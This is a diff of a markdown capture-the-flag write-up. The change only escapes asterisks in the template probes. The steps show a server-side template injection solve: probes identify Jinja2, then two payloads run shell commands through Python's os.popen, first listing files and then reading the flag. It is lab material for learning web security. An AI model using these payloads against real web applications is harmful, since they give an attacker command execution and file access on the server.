@@ -34,7 +34,7 @@
 
 ### Solution 2 (After Researching Methods)
 1. Access website and test announcement field to see output 
-2. Follow payload tests to test for server side template injection vulnerability and uncover template engine (${7*7} -> {{7*7}} -> {{7*'7'}} -> Jinja2)
+2. Follow payload tests to test for server side template injection vulnerability and uncover template engine (${7\*7} -> {{7\*7}} -> {{7\*'7'}} -> Jinja2)
 3. {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }} -> Shows the files on the server
 4. {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
 5. Flag obtained -> academy{REDACTED}
